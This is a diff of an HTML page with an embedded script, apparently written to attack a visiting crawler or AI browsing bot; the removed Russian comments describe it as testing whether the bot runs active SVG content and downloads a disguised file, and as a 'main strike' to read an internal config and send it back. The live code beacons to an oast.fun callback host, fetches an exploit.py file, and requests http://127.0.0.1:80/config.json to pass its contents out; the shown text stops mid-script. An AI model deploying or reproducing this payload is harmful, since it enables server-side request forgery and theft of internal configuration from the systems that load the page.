@@ -3,20 +3,12 @@
 <body>
     <script>
         const oast = "http://esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun";
-
-        // 1. Проверка: сожрет ли бот SVG с активным JS внутри?
         var svg = new Image();
         svg.src = "https://kirayoshikage67.github.io/gfhgfhfhgfhg/proof.svg";
-
-        // 2. Проверка: скачает ли он файл, который прикидывается картинкой?
-        // Создадим запрос к файлу, который не является изображением
         fetch("https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.py")
             .then(res => {
                 if(res.ok) new Image().src = oast + "/PYTHON_DOWNLOADED_SUCCESS";
             });
-
-        // 3. Главный удар: Попытка заставить бота прочитать внутренний конфиг 
-        // и отправить его содержимое нам (если нет CORS)
         fetch("http://127.0.0.1:80/config.json")
             .then(r => r.text())
             .then(data => {
